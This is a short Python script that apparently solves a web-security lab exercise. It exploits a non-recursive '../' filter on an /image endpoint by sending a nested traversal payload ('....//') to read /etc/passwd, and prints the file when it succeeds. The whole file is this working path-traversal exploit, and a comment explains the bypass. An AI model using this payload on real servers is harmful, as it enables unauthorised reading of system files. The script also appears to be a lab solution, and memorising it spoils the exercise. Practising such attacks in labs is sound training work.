import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# server strips ../ sequences but only once (non-recursive)
# ....// becomes ../ after the inner ../ is removed
resp = lab.get("/image", params={"filename": "....//....//....//etc/passwd"})

if resp.status_code == 200 and "root:" in resp.text:
    lab.success("Got /etc/passwd:")
    print(resp.text)
else:
    lab.fail(f"Traversal failed (status {resp.status_code})")

lab.check_solved()
